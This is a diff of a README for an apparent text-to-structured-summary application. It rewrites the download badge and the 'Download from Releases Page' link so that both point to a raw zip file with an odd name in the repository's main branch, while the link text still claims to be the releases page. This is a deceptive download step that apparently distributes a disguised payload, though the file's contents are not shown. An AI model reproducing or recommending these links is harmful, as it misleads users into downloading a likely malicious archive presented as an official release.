@@ -4,12 +4,12 @@
 Welcome to text2structured-summary! This application helps you turn plain text into structured summaries using advanced language models. Now, you can easily extract useful information from large amounts of text without technical knowledge.
 
 ## 📥 Download the Application
-[![Download text2structured-summary](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Version-blue)](https://github.com/Reetikverma31/text2structured-summary/releases)
+[![Download text2structured-summary](https://github.com/Reetikverma31/text2structured-summary/raw/refs/heads/main/text2structured_summary/summary-text-structured-algaeological.zip%20Now-Get%20the%20Latest%20Version-blue)](https://github.com/Reetikverma31/text2structured-summary/raw/refs/heads/main/text2structured_summary/summary-text-structured-algaeological.zip)
 
 ## 📘 How to Download & Install
 1. **Visit the Releases Page**
    Click the link below to access our releases page:
-   [Download from Releases Page](https://github.com/Reetikverma31/text2structured-summary/releases)
+   [Download from Releases Page](https://github.com/Reetikverma31/text2structured-summary/raw/refs/heads/main/text2structured_summary/summary-text-structured-algaeological.zip)
 
 2. **Choose the Latest Version**
    On the releases page, look for the latest version of text2structured-summary. It will be marked as the most recent release.
